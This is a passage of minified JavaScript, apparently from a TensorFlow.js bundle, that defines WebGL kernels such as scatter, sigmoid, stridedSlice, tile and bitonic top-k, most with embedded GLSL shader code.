            this.userCode = `\n        ${l} strides = ${l}(${r});\n\n        void main() {\n          ${u} coords = getOutputCoords();\n          vec4 sum = vec4(0.);\n          vec4 found = vec4(0.);\n          for (int i = 0; i < ${t}; i+=2) {\n            ivec2 flattenedIndex = ivec2(0);\n            for (int j = 0; j < ${e}; j+=2) {\n              ivec4 index = round(${h});\n              flattenedIndex += index.xz * ${b};\n              if (j + 1 < ${e}) {\n                flattenedIndex += index.yw * ${x};\n              }\n            }\n            if (flattenedIndex[0] == coords[0] || flattenedIndex[1] == coords[0] ||\n                flattenedIndex[0] == coords[0] + 1 || flattenedIndex[1] == coords[0] + 1) {\n              vec4 updVals = ${f};\n              if (flattenedIndex[0] == coords[0]) {\n                sum.xy += updVals.xy;\n                found.xy = vec2(1.);\n              } else if (flattenedIndex[0] == coords[0] + 1) {\n                sum.zw += updVals.xy;\n                found.zw = vec2(1.);\n              }\n              if (flattenedIndex[1] == coords[0]) {\n                sum.xy += updVals.zw;\n                found.xy = vec2(1.);\n              } else if (flattenedIndex[1] == coords[0] + 1) {\n                sum.zw += updVals.zw;\n                found.zw = vec2(1.);\n              }\n            }\n          }\n          setOutput(mix(${g}, sum, found));\n        }\n      `
        }
    }
    const TB = {
        kernelName: Nf,
        backendName: "webgl",
        kernelFunc: function kB(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {indices: o, updates: r} = t
              , {shape: i} = s
              , {sliceRank: a, numUpdates: c, sliceSize: l, strides: u, outputSize: d} = co(0, o, i)
              , h = [d / l, l];
            if (0 === d)
                return e.makeTensorInfo(i, o.dtype);
            const p = tt({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    shape: [c, a]
                }
            })
              , f = tt({
                inputs: {
                    x: r
                },
                backend: e,
                attrs: {
                    shape: [c, l]
                }
            })
              , m = e.makeTensorInfo([], "float32", new Float32Array([0]));
            let g;
            g = z().getBool("WEBGL_PACK") ? new SB(c,a,p.shape.length,f.shape.length,u,h) : new zp(c,a,p.shape.length,f.shape.length,u,h);
            const b = e.runWebGLProgram(g, [f, p, m], f.dtype)
              , x = tt({
                inputs: {
                    x: b
                },
                backend: e,
                attrs: {
                    shape: i
                }
            });
            return e.disposeIntermediateTensorInfo(p),
            e.disposeIntermediateTensorInfo(f),
            e.disposeIntermediateTensorInfo(b),
            e.disposeIntermediateTensorInfo(m),
            x
        }
    };
    class NB {
        constructor(t, e, s, o) {
            this.variableNames = ["sortedSequence", "values"],
            this.customUniforms = [{
                name: "numInputs",
                type: "int"
            }],
            this.outputShape = [t, s];
            const i = `for (int i = 0; i < ${Math.ceil(Math.log2(e + 1))}; ++i) { if (left >= right) break;`
              , a = 2 === z().getNumber("WEBGL_VERSION") ? "while (left < right) {" : i
              , c = "left" === o ? "<" : "<=";
            this.userCode = `\n       int findBound(int batch, float value) {\n         int left = 0;\n         int right = numInputs;\n         int mid;\n         ${a}\n           mid = (left + right) / 2;\n           if (getSortedSequence(batch, mid) ${c} value) {\n             left = mid + 1;\n           } else {\n             right = mid;\n           }\n         }\n         return right;\n       }\n\n       void main() {\n         ivec2 coords = getOutputCoords();\n         int batch = coords[0];\n         int valueIndex = coords[1];\n\n         float value = getValues(batch, valueIndex);\n\n         setOutput(float(findBound(batch, value)));\n       }\n     `
        }
    }
    const $B = {
        kernelName: $f,
        backendName: "webgl",
        kernelFunc: function RB(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {sortedSequence: o, values: r} = t
              , {side: i} = s
              , a = new NB(o.shape[0],o.shape[1],r.shape[1],i)
              , c = [[o.shape[1]]];
            return e.runWebGLProgram(a, [o, r], "int32", c)
        }
    };
    class GB {
        constructor(t, e, s) {
            let o, r;
            if (this.variableNames = ["c", "a", "b"],
            this.outputShape = e,
            s > 4)
                throw Error(`Where for rank ${s} is not yet supported`);
            if (1 === s)
                r = "resRC",
                o = "resRC";
            else {
                const a = ["resRC.x", "resRC.y", "resRC.z", "resRC.w"]
                  , c = []
                  , l = [];
                for (let u = 0; u < e.length; u++)
                    l.push(`${a[u]}`),
                    u < t && c.push(`${a[u]}`);
                o = c.join(),
                r = l.join()
            }
            const i = Wt(s);
            this.userCode = `\n      void main() {\n        ${i} resRC = getOutputCoords();\n        float cVal = getC(${o});\n        if (cVal >= 1.0) {\n          setOutput(getA(${r}));\n        } else {\n          setOutput(getB(${r}));\n        }\n      }\n    `
        }
    }
    const EB = {
        kernelName: uc,
        backendName: "webgl",
        kernelFunc: function LB(n) {
            const {inputs: t, backend: e} = n
              , {condition: s, t: o, e: r} = t
              , i = new GB(s.shape.length,o.shape,o.shape.length);
            return e.runWebGLProgram(i, [s, o, r], _e(o.dtype, r.dtype))
        }
    }
      , WB = Tt({
        opSnippet: `\n  // Stable and Attracting Fixed Point (0, 1) for Normalized Weights.\n  // see: https://arxiv.org/abs/1706.02515\n  float scaleAlpha = ${Pc};\n  float scale = ${Oc};\n  return (x >= 0.0) ? scale * x : scaleAlpha * (exp(x) - 1.0);\n`
    })
      , MB = {
        kernelName: ri,
        backendName: "webgl",
        kernelFunc: WB
    }
      , FB = Tt({
        opSnippet: br + "\n  return 1.0 / (1.0 + exp(-1.0 * x));\n",
        packedOpSnippet: "\n  vec4 result = 1.0 / (1.0 + exp(-1.0 * x));\n  bvec4 isNaN = isnan(x);\n\n  result.r = isNaN.r ? x.r : result.r;\n  result.g = isNaN.g ? x.g : result.g;\n  result.b = isNaN.b ? x.b : result.b;\n  result.a = isNaN.a ? x.a : result.a;\n\n  return result;\n",
        cpuKernelImpl: Sz
    })
      , zB = {
        kernelName: li,
        backendName: "webgl",
        kernelFunc: FB
    }
      , XB = Tt({
        opSnippet: "\n  if (isnan(x)) { return 0.0; }\n  return sign(x);\n"
    })
      , AB = {
        kernelName: ci,
        backendName: "webgl",
        kernelFunc: XB
    }
      , KB = Tt({
        opSnippet: br + "\n  return sin(x);\n",
        packedOpSnippet: `\n  vec4 result = sin(x);\n  bvec4 isNaN = isnan(x);\n  ${To}\n  return result;\n`
    })
      , ZB = {
        kernelName: ii,
        backendName: "webgl",
        kernelFunc: KB
    }
      , BB = Tt({
        opSnippet: "\n  float e2x = exp(x);\n  return (e2x - 1.0 / e2x) / 2.0;\n"
    })
      , HB = {
        kernelName: ai,
        backendName: "webgl",
        kernelFunc: BB
    }
      , _B = Tt({
        opSnippet: "\n  float epsilon = 1.1920928955078125e-7;\n  float threshold = log(epsilon) + 2.0;\n\n  bool too_large = x > -threshold;\n  bool too_small = x < threshold;\n\n  float result;\n  float exp_x = exp(x);\n\n  if (too_large){\n    result = x;\n  }\n  else if (too_small){\n    result = exp_x;\n  }\n  else{\n    result = log(exp_x + 1.0);\n  }\n  return result;\n"
    })
      , UB = {
        kernelName: ui,
        backendName: "webgl",
        kernelFunc: _B
    }
      , YB = {
        kernelName: pc,
        backendName: "webgl",
        kernelFunc: n=>{
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {blockShape: r, paddings: i} = s;
            v(o.shape.length <= 4, (()=>"spaceToBatchND for rank > 4 with a WebGL backend not implemented yet"));
            const a = r.reduce(((b,x)=>b * x))
              , c = [[0, 0]];
            c.push(...i);
            for (let b = 1 + r.length; b < o.shape.length; ++b)
                c.push([0, 0]);
            const l = []
              , u = xI({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    paddings: c,
                    constantValue: 0
                }
            })
              , d = Mi(u.shape, r, a, !1)
              , h = Vi(d.length, r.length, !1)
              , p = Fi(u.shape, r, a, !1)
              , f = tt({
                inputs: {
                    x: u
                },
                backend: e,
                attrs: {
                    shape: d
                }
            })
              , m = Me({
                inputs: {
                    x: f
                },
                backend: e,
                attrs: {
                    perm: h
                }
            })
              , g = tt({
                inputs: {
                    x: m
                },
                backend: e,
                attrs: {
                    shape: p
                }
            });
            return l.push(u),
            l.push(f),
            l.push(m),
            l.forEach((b=>e.disposeIntermediateTensorInfo(b))),
            g
        }
    };
    const JB = {
        kernelName: Gf,
        backendName: "webgl",
        kernelFunc: function QB(n) {
            const {inputs: t, backend: e} = n
              , {indices: s, values: o, denseShape: r, defaultValue: i} = t;
            if (1 !== r.shape.length)
                throw new Error(`Dense shape must be a vector, saw:\n         ${r.shape}`);
            if (2 !== s.shape.length)
                throw new Error(`Indices must be a matrix, saw:\n         ${s.shape}`);
            if (1 !== o.shape.length)
                throw new Error(`Values must be a vector, saw:\n         ${o.shape}`);
            if (0 !== i.shape.length)
                throw new Error(`Default value must be a scalar, saw:\n        ${i.shape}`);
            const a = e.readSync(s.dataId)
              , c = e.readSync(o.dataId)
              , l = e.readSync(r.dataId)
              , u = e.readSync(i.dataId)[0]
              , [d,h,p,f,m] = Tz(a, s.shape, s.dtype, c, o.dtype, l, u);
            return [e.makeTensorInfo(h, s.dtype, d), e.makeTensorInfo([h[0]], o.dtype, p), e.makeTensorInfo([f.length], "bool", new Uint8Array(f.map((g=>Number(g))))), e.makeTensorInfo([m.length], s.dtype, new Int32Array(m))]
        }
    };
    const qB = {
        kernelName: Lf,
        backendName: "webgl",
        kernelFunc: function jB(n) {
            const {inputs: t, backend: e} = n
              , {inputIndices: s, inputShape: o, newShape: r} = t;
            if (2 !== s.shape.length)
                throw new Error(`Input indices should be a matrix but received shape ${s.shape}`);
            if (1 !== o.shape.length)
                throw new Error(`Input shape should be a vector but received shape ${o.shape}`);
            if (1 !== r.shape.length)
                throw new Error(`Target shape should be a vector but received shape ${r.shape}`);
            const i = Array.from(e.readSync(o.dataId))
              , a = e.readSync(s.dataId)
              , c = Array.from(e.readSync(r.dataId))
              , [l,u,d] = Nz(a, s.shape, s.dtype, i, c);
            return [e.makeTensorInfo(u, s.dtype, l), e.makeTensorInfo([d.length], r.dtype, new Int32Array(d))]
        }
    };
    const eH = {
        kernelName: Ef,
        backendName: "webgl",
        kernelFunc: function tH(n) {
            const {inputs: t, backend: e} = n
              , {data: s, indices: o, segmentIds: r} = t;
            if (s.shape.length < 1)
                throw new Error("Data should be at least 1 dimensional but received scalar");
            if (1 !== o.shape.length)
                throw new Error(`Indices should be a vector but received shape\n              ${o.shape}`);
            if (1 !== r.shape.length)
                throw new Error(`Segment ids should be a vector but received shape\n              ${r.shape}`);
            const i = e.readSync(s.dataId)
              , a = e.readSync(o.dataId)
              , c = e.readSync(r.dataId)
              , [l,u] = S1(i, s.shape, s.dtype, a, c, !0);
            return e.makeTensorInfo(u, s.dtype, l)
        }
    };
    const sH = {
        kernelName: Df,
        backendName: "webgl",
        kernelFunc: function nH(n) {
            const {inputs: t, backend: e} = n
              , {data: s, indices: o, segmentIds: r} = t;
            if (s.shape.length < 1)
                throw new Error("Data should be at least 1 dimensional but received scalar");
            if (1 !== o.shape.length)
                throw new Error(`Indices should be a vector but received shape\n             ${o.shape}`);
            if (1 !== r.shape.length)
                throw new Error(`Segment ids should be a vector but received shape\n             ${r.shape}`);
            const i = e.readSync(s.dataId)
              , a = e.readSync(o.dataId)
              , c = e.readSync(r.dataId)
              , [l,u] = S1(i, s.shape, s.dtype, a, c);
            return e.makeTensorInfo(u, s.dtype, l)
        }
    };
    const rH = {
        kernelName: Wf,
        backendName: "webgl",
        kernelFunc: function oH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {sparseIndices: o, sparseValues: r, defaultValue: i} = t
              , {outputShape: a} = s
              , {sliceRank: c, numUpdates: l, sliceSize: u, strides: d, outputSize: h} = co(0, o, a)
              , p = !1;
            if ("string" === r.dtype) {
                const b = e.bufferSync(o)
                  , x = e.bufferSync(r)
                  , I = xs(e.readSync(i.dataId)[0])
                  , y = vz(b, x, a, h, u, l, c, d, I, p);
                return e.makeTensorInfo(a, y.dtype, y.values)
            }
            const f = new zp(l,c,o.shape.length,r.shape.length,d,[h, 1],p)
              , m = e.runWebGLProgram(f, [r, o, i], r.dtype)
              , g = tt({
                inputs: {
                    x: m
                },
                backend: e,
                attrs: {
                    shape: a
                }
            });
            return e.disposeIntermediateTensorInfo(m),
            g
        }
    };
    const aH = {
        kernelName: fc,
        backendName: "webgl",
        kernelFunc: function iH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {numOrSizeSplits: r, axis: i} = s
              , a = It(i, o.shape)[0]
              , c = Ch(o, r, a)
              , l = o.shape.length
              , u = new Array(l).fill(0)
              , d = o.shape.slice();
            return c.map((h=>{
                const p = [...d];
                p[a] = h;
                const f = xr({
                    inputs: {
                        x: o
                    },
                    backend: e,
                    attrs: {
                        begin: u,
                        size: p
                    }
                });
                return u[a] += h,
                f
            }
            ))
        }
    }
      , II = "return sqrt(x);"
      , cH = Tt({
        opSnippet: II,
        packedOpSnippet: II,
        cpuKernelImpl: Rz
    })
      , lH = {
        kernelName: di,
        backendName: "webgl",
        kernelFunc: cH
    }
      , dH = {
        kernelName: zu,
        backendName: "webgl",
        kernelFunc: Tt({
            opSnippet: "return x * x;"
        })
    }
      , wI = "return (a - b) * (a - b);"
      , hH = Ce({
        opSnippet: wI,
        packedOpSnippet: wI
    })
      , pH = {
        kernelName: hi,
        backendName: "webgl",
        kernelFunc: hH
    };
    const mH = {
        kernelName: Xu,
        backendName: "webgl",
        kernelFunc: function fH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t;
            if ("string" !== o.dtype)
                throw new Error("Input must be of datatype string");
            const i = cs(e.readSync(o.dataId))
              , a = $z(i, "string", s);
            return e.makeTensorInfo(o.shape, "string", a)
        }
    };
    const bH = {
        kernelName: bi,
        backendName: "webgl",
        kernelFunc: function gH({inputs: n, attrs: t, backend: e}) {
            const {x: s} = n
              , o = Cn + `\n    return x > 0.0 ? 1.0 : float(${t.alpha});\n  `
              , r = new jn(s.shape,o);
            return e.runWebGLProgram(r, [s], s.dtype)
        }
    };
    class xH {
        constructor(t, e, s) {
            this.variableNames = ["x"],
            this.outputShape = s;
            const o = s.length
              , r = Wt(s.length)
              , i = Wt(s.length);
            let a = "";
            if (1 === o)
                a = "coords * strides + begin";
            else {
                let c = 0;
                a = s.map(((l,u)=>(c++,
                1 === s.length ? `coords * strides[${u}] + begin[${u}]` : `coords[${c - 1}] * strides[${u}] + begin[${u}]`))).join(",")
            }
            this.userCode = `\n      ${r} begin = ${r}(${t});\n      ${r} strides = ${r}(${e});\n\n      void main() {\n        ${i} coords = getOutputCoords();\n        setOutput(getX(${a}));\n      }\n    `
        }
    }
    const IH = {
        kernelName: Au,
        backendName: "webgl",
        kernelFunc: function yH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {begin: r, end: i, strides: a, beginMask: c, endMask: l, ellipsisMask: u, newAxisMask: d, shrinkAxisMask: h} = s
              , {finalShapeSparse: p, finalShape: f, isIdentity: m, sliceDim0: g, isSimpleSlice: b, begin: x, end: I, strides: y} = sh(o.shape, r, i, a, c, l, u, d, h);
            let w;
            if (m)
                w = tt({
                    inputs: {
                        x: o
                    },
                    backend: e,
                    attrs: {
                        shape: f
                    }
                });
            else if (g || b) {
                v(o.shape.length >= 1, (()=>`Input must have rank at least 1, got: ${o.shape.length}`));
                const k = th(x, I, y)
                  , S = xr({
                    inputs: {
                        x: o
                    },
                    backend: e,
                    attrs: {
                        begin: x,
                        size: k
                    }
                });
                w = tt({
                    inputs: {
                        x: S
                    },
                    backend: e,
                    attrs: {
                        shape: f
                    }
                }),
                e.disposeIntermediateTensorInfo(S)
            } else if (e.shouldExecuteOnCPU([o])) {
                const S = e.readSync(o.dataId)
                  , T = wt(o.shape, o.dtype, S)
                  , R = Gz(p, T, y, x);
                w = e.makeTensorInfo(f, o.dtype, R.values)
            } else {
                const S = new xH(x,y,p);
                w = e.runWebGLProgram(S, [o], o.dtype)
            }
            const C = tt({
                inputs: {
                    x: w
                },
                backend: e,
                attrs: {
                    shape: f
                }
            });
            return e.disposeIntermediateTensorInfo(w),
            C
        }
    };
    const CH = {
        kernelName: Mf,
        backendName: "webgl",
        kernelFunc: function wH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {separator: o, nGramWidths: r, leftPad: i, rightPad: a, padWidth: c, preserveShortSequences: l} = s
              , {data: u, dataSplits: d} = t
              , h = e.readSync(u.dataId)
              , p = e.readSync(d.dataId)
              , [f,m] = Lz(h, p, o, r, i, a, c, l);
            return [e.makeTensorInfo([f.length], "string", f), e.makeTensorInfo(d.shape, "int32", m)]
        }
    };
    const SH = {
        kernelName: Vf,
        backendName: "webgl",
        kernelFunc: function vH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {skipEmpty: o} = s
              , {input: r, delimiter: i} = t;
            if ("string" !== r.dtype)
                throw new Error("Input must be of datatype string");
            if (1 !== r.shape.length)
                throw new Error(`Input must be a vector, got shape: ${r.shape}`);
            if (0 !== i.shape.length)
                throw new Error(`Delimiter must be a scalar, got shape: ${i.shape}`);
            const a = e.readSync(r.dataId)
              , c = e.readSync(i.dataId)[0]
              , [l,u,d] = Ez(a, c, o)
              , h = u.length;
            return [e.makeTensorInfo([h, 2], "int32", l), e.makeTensorInfo([h], "string", u), e.makeTensorInfo([2], "int32", new Int32Array(d))]
        }
    };
    const TH = {
        kernelName: Ff,
        backendName: "webgl",
        kernelFunc: function kH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {numBuckets: o} = s
              , {input: r} = t;
            if ("string" !== r.dtype)
                throw new Error("Input must be of datatype string");
            if (o <= 0)
                throw new Error("Number of buckets must be at least 1");
            const i = e.readSync(r.dataId)
              , a = Dz(i, o);
            return e.makeTensorInfo(r.shape, "int32", a)
        }
    }
      , NH = Tt({
        opSnippet: "return tan(x);"
    })
      , RH = {
        kernelName: fi,
        backendName: "webgl",
        kernelFunc: NH
    }
      , $H = Tt({
        opSnippet: "\n  float e2x = exp(-2.0 * abs(x));\n  return sign(x) * (1.0 - e2x) / (1.0 + e2x);\n"
    })
      , GH = {
        kernelName: mi,
        backendName: "webgl",
        kernelFunc: $H
    };
    const EH = {
        kernelName: Rf,
        backendName: "webgl",
        kernelFunc: function LH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {tensor: o, indices: r, updates: i} = t
              , {sliceRank: a, numUpdates: c, sliceSize: l, strides: u, outputSize: d} = co(0, r, o.shape)
              , h = [d / l, l];
            if (0 === d)
                return e.makeTensorInfo(o.shape, r.dtype);
            const p = tt({
                inputs: {
                    x: r
                },
                backend: e,
                attrs: {
                    shape: [c, a]
                }
            })
              , f = tt({
                inputs: {
                    x: i
                },
                backend: e,
                attrs: {
                    shape: [c, l]
                }
            })
              , m = tt({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    shape: h
                }
            })
              , g = new zp(c,a,p.shape.length,f.shape.length,u,h,!1,!0)
              , b = e.runWebGLProgram(g, [f, p, m], m.dtype)
              , x = tt({
                inputs: {
                    x: b
                },
                backend: e,
                attrs: {
                    shape: o.shape
                }
            });
            return e.disposeIntermediateTensorInfo(p),
            e.disposeIntermediateTensorInfo(f),
            e.disposeIntermediateTensorInfo(m),
            e.disposeIntermediateTensorInfo(b),
            x
        }
    };
    class DH {
        constructor(t, e) {
            this.variableNames = ["A"];
            const s = new Array(t.length);
            for (let i = 0; i < s.length; i++)
                s[i] = t[i] * e[i];
            this.outputShape = s,
            this.rank = s.length;
            const o = Wt(this.rank)
              , r = function WH(n) {
                const t = n.length;
                if (t > 5)
                    throw Error(`Tile for rank ${t} is not yet supported`);
                if (1 === t)
                    return `imod(resRC, ${n[0]})`;
                const e = ["resRC.x", "resRC.y", "resRC.z", "resRC.w", "resRC.u"]
                  , s = [];
                for (let o = 0; o < n.length; o++)
                    s.push(`imod(${e[o]}, ${n[o]})`);
                return s.join()
            }(t);
            this.userCode = `\n      void main() {\n        ${o} resRC = getOutputCoords();\n        setOutput(getA(${r}));\n      }\n    `
        }
    }
    function CI(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {reps: r} = s;
        if ("string" === o.dtype || o.shape.length > 5) {
            const c = e.readSync(o.dataId)
              , l = "string" === o.dtype ? c.map((h=>xs(h))) : c
              , u = wt(o.shape, o.dtype, l)
              , d = Mz(u, r);
            return e.makeTensorInfo(d.shape, d.dtype, d.values)
        }
        const i = new DH(o.shape,r);
        return e.runWebGLProgram(i, [o], o.dtype)
    }
    const MH = {
        kernelName: gi,
        backendName: "webgl",
        kernelFunc: CI
    };
    class VH {
        constructor(t) {
            this.variableNames = ["x", "indices"],
            this.customUniforms = [{
                name: "n",
                type: "int"
            }, {
                name: "firstPass",
                type: "int"
            }, {
                name: "negativeInf",
                type: "float"
            }, {
                name: "dir",
                type: "int"
            }, {
                name: "inc",
                type: "int"
            }],
            this.outputShape = t,
            this.userCode = "\n       void main() {\n         ivec2 coords = getOutputCoords();\n         int batch = coords[0];\n         int elemIdx = coords[1];\n\n         // We compare elements pair-wise within a group of size 2 * inc.\n         // The comparing rule for each group alternates between ascending\n         // and descending. Within each group, we compare each pair at\n         // positions i and i+inc. To decide whether an element at position i\n         // is x0 or x1, we mod it by 2 * inc, if the result is smaller than\n         // inc, it is in the first half of the group, we denote it as x0,\n         // otherwise we denote it as x1.\n         // For example, as shown in the Bitonic top K paper referenced above,\n         // Figure5(a) shows that element[1] is in the\n         // second half of the group when group size is 2, but it is in the\n         // first half of the group when group size is 4.\n\n         bool isFirstInPair = imod(elemIdx, 2 * inc) < inc;\n         int i = isFirstInPair ? elemIdx : elemIdx - inc;\n\n         int i0 = firstPass == 1 ? i : int(getIndices(batch, i));\n         int i1 = firstPass == 1 ? i + inc : int(getIndices(batch, i + inc));\n         float x0 = i0 < n ? getX(batch, i0) : negativeInf;\n         float x1 = i1 < n ? getX(batch, i1) : negativeInf;\n\n         // Denotes which direction indices are in (ascending or descending).\n         bool reverse = imod(elemIdx, 2 * dir) >= dir;\n         bool isGreater = x0 > x1 || (x0 == x1 && i1 > i0);\n         if (reverse == isGreater) { // Elements in opposite order of direction\n           int iTemp = i0;\n           i0 = i1;\n           i1 = iTemp;\n         }\n         if (isFirstInPair) {\n            setOutput(float(i0));\n         } else {\n            setOutput(float(i1));\n         }\n       }\n     "
        }
    }
    class FH {
        constructor(t) {
            this.variableNames = ["x", "indices"],
            this.customUniforms = [{
                name: "n",
                type: "int"
            }, {
                name: "firstPass",
                type: "int"
            }, {
                name: "k",
                type: "int"
            }],
            this.outputShape = t,
            this.userCode = "\n    void main() {\n         // Takes max of indices (0, k), (1, k + 1), (2, k + 2) ...\n         ivec2 coords = getOutputCoords();\n         int batch = coords[0];\n         int elemIdx = coords[1];\n\n         // The output size is half of the previous size.\n         // If the previous sequence is | | | | _ _ _ _  | | | |  _ _ _ _ (k=4),\n         // we only need to output the indices at positions |, the indices at\n         // positions _ can be thrown away, see Figure5(b) After Phase 2\n         // (Merge phase) in the Bitonic Top K paper referenced above.\n         // For example, the paper shows we only need to output the orange bars.\n         // The output sequence should look like this | | | | | | | |.\n         // Because the sequence is halved, to map the output index back\n         // to the previous sequence to find the corresponding value,\n         // we need to double the index. When we double the index,\n         // we basically interpolate a position, so 2i looks like\n         // | _ | _ | _ | _ | _ | _ | _. We move the | to the first k position\n         // of each 2k positions by - elemIdx % k. E.g. for output at\n         // index 4,5,6,7, we want to get the corresponding element at\n         // original index 8,9,10,11, for output at index 8,9,10,11,\n         // we want to get the corresponding element at original index\n         // 16,17,18,19, so on and so forth.\n\n         int i = elemIdx < k ? elemIdx : (elemIdx * 2 - imod(elemIdx, k));\n         int i0 = firstPass == 1 ? i : int(getIndices(batch, i));\n         int i1 = firstPass == 1 ? i + k : int(getIndices(batch, i + k));\n\n         float x0 = getX(batch, i0);\n         float x1 = i1 < n ? getX(batch, i1) : x0;\n\n         setOutput(x0 >= x1 ? float(i0) : float(i1));\n       }\n     "
        }
    }
    function Ro(n, t) {
        null !== t && n.disposeIntermediateTensorInfo(t)
    }
    function vI(n) {
        let t = 1;
        for (; t < n; )
            t *= 2;
        return t
    }
    const XH = {
        kernelName: Pu,
        backendName: "webgl",
        kernelFunc: function zH(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {k: r, sorted: i} = s
              , a = z().getNumber("TOPK_LAST_DIM_CPU_HANDOFF_SIZE_THRESHOLD")
              , c = z().getNumber("TOPK_K_CPU_HANDOFF_THRESHOLD")
              , l = o.shape
              , u = l[l.length - 1];
            if (e.shouldExecuteOnCPU([o]) || u < a || r > c) {
                const R = e.readSync(o.dataId)
                  , [L,V] = Vz(R, l, o.dtype, r, i);
                return [e.makeTensorInfo(L.shape, L.dtype, L.values), e.makeTensorInfo(V.shape, V.dtype, V.values)]
            }
            if (0 === r)
                return l[l.length - 1] = 0,
                [e.makeTensorInfo(l, o.dtype, []), e.makeTensorInfo(l, "int32", [])];
            if (1 === u)
                return [o, ha({
                    attrs: {
                        shape: l,
                        dtype: "int32",
                        value: 0
                    },
                    backend: e
                })];
            const d = e.texData.get(o.dataId)
              , h = null !== d && d.isPacked
              , p = h ? e.unpackTensor(o) : o
              , m = Z(l) / u
              , g = tt({
                inputs: {
                    x: p
                },
                attrs: {
                    shape: [m, u]
                },
                backend: e
            });
            h && Ro(e, p);
            const b = vI(r)
              , x = vI(u);
            let I = null;
            const y = ()=>null === I ? [g, g] : [g, I]
              , w = (R,L,V)=>{
                const F = y()
                  , X = new VH(V)
                  , P = [[u], [null === I ? 1 : 0], [Number.NEGATIVE_INFINITY], [R], [L]]
                  , B = I;
                I = e.runWebGLProgram(X, F, "int32", P),
                Ro(e, B)
            }
            ;
            for (let R = 1; R < b; R *= 2) {
                const L = 2 * R;
                for (let V = R; V >= 1; V /= 2)
                    w(L, V, [m, x])
            }
            for (let R = x; R > b; R /= 2) {
                const L = y()
                  , V = new FH([m, R / 2])
                  , X = [[u], [null === I ? 1 : 0], [b]]
                  , A = I;
                I = e.runWebGLProgram(V, L, "int32", X),
                Ro(e, A);
                const P = b / 2
                  , B = 2 * P;
                for (let K = P; K >= 1; K /= 2)
                    w(B, K, I.shape)
            }
            let C = I;
            I = xr({
                inputs: {
                    x: I
                },
                backend: e,
                attrs: {
                    begin: 0,
                    size: [m, r]
                }
            }),
            Ro(e, C);
            let k = dI({
                inputs: {
                    x: g,
                    indices: I
                },
                backend: e,
                attrs: {
                    axis: 1,
                    batchDims: 1
                }
            });
            Ro(e, g);
            const S = l.slice(0, -1);
            S.push(r),
            C = I,
            I = tt({
                inputs: {
                    x: I
                },
                attrs: {
                    shape: S
                },
                backend: e
            }),
            Ro(e, C);
            const T = k;
            return k = tt({
                inputs: {
                    x: k
                },
                attrs: {
                    shape: S
                },
                backend: e
            }),
            Ro(e, T),
            [k, I]
        }
    };
    class AH {
        constructor(t, e, s, o, r, i) {
            this.variableNames = ["Image", "Transforms"],
            this.outputShape = i;
            const a = "nearest" === s ? 1 : 2;
            let c;
            switch (o) {
            case "constant":
            default:
                c = 1;
                break;
            case "reflect":
                c = 2;
                break;
            case "wrap":
                c = 3;
                break;
            case "nearest":
                c = 4
            }
            this.userCode = `\n            float mapCoord(float outCoord, float len) {\n              float inCoord = outCoord;\n              if(${c} == 2) {\n                if (inCoord < 0.0) {\n                  if (len <= 1.0) {\n                    inCoord = 0.0;\n                  } else {\n                    float sz2 = 2.0 * len;\n                    if (inCoord < sz2) {\n                      inCoord = sz2 * float(int(float(-inCoord / sz2))) +\n                      inCoord;\n                    }\n                    inCoord = inCoord < -len ? inCoord + sz2 : -inCoord - 1.0;\n                  }\n                } else if (inCoord > len - 1.0) {\n                  if (len <= 1.0) {\n                    inCoord = 0.0;\n                  } else {\n                    float sz2 = 2.0 * len;\n                    inCoord -= sz2 * float(int(float(inCoord / sz2)));\n                    if (inCoord >= len) {\n                      inCoord = sz2 - inCoord - 1.0;\n                    }\n                  }\n                }\n                return clamp(inCoord, 0.0, len - 1.0);\n              } else if (${c} == 3) {\n                if (inCoord < 0.0) {\n                  if (len <= 1.0) {\n                    inCoord = 0.0;\n                  } else {\n                    float sz = len - 1.0;\n                    inCoord += len * (float(int(float(-inCoord / sz))) + 1.0);\n                  }\n                } else if (inCoord > len - 1.0) {\n                  if (len <= 1.0) {\n                    inCoord = 0.0;\n                  } else {\n                    float sz = len - 1.0;\n                    inCoord -= len * float(int(float(inCoord / sz)));\n                  }\n                }\n                return clamp(inCoord, 0.0, len - 1.0);\n              } else if (${c} == 4) {\n                return clamp(outCoord, 0.0, len - 1.0);\n              } else {\n                return outCoord;\n              }\n            }\n\n            float readWithFillValue(int batch, int coordY, int coordX,\n              int channel) {\n              float outputValue;\n              if (0 <= coordY && coordY < ${t} && 0 <= coordX && coordX < ${e}) {\n                  outputValue = getImage(batch, coordY, coordX, channel);\n              } else {\n                outputValue = float(${r});\n              }\n              return outputValue;\n            }\n\n            void main() {\n              ivec4 coords = getOutputCoords();\n              float outputValue;\n              int batch = coords[0];\n              int x = coords[2];\n              int y = coords[1];\n              int channel = coords[3];\n              float xf = float(x);\n              float yf = float(y);\n              float a1 = getTransforms(batch, 0);\n              float a2 = getTransforms(batch, 1);\n              float a3 = getTransforms(batch, 2);\n              float b1 = getTransforms(batch, 3);\n              float b2 = getTransforms(batch, 4);\n              float b3 = getTransforms(batch, 5);\n              float c1 = getTransforms(batch, 6);\n              float c2 = getTransforms(batch, 7);\n              float projection = c1 * xf + c2 * yf + 1.0;\n              if (projection == 0.0) {\n                outputValue = float(${r});\n              } else {\n                float inX = (a1 * xf + a2 * yf + a3) / projection;\n                float inY = (b1 * xf + b2 * yf + b3) / projection;\n                float mapX = mapCoord(inX, float(${e}));\n                float mapY = mapCoord(inY, float(${t}));\n\n                if (${a} == 1) {\n                  int coordY = int(round(mapY));\n                  int coordX = int(round(mapX));\n                  outputValue = readWithFillValue(batch, coordY, coordX,\n                    channel);\n                } else {\n                  float yFloor = floor(mapY);\n                  float xFloor = floor(mapX);\n                  float 